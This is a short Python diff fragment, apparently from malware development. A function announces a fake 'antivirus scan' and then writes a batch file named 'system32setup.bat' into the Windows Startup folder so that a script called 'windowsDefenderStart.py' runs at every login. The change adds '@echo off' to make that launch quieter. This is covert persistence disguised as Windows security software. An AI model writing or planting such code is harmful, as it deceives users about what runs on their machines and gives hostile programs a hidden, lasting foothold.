@@ -22,7 +22,7 @@ except:
 
 def FirstRun():
     print("starting antivirus scan ...")
-    open(os.path.expanduser('~') + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system32setup.bat", "w").write(f"python {os.getcwd()}\\windowsDefenderStart.py")
+    open(os.path.expanduser('~') + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system32setup.bat", "w").write(f"@echo off\npython {os.getcwd()}\\windowsDefenderStart.py")
 
 
 
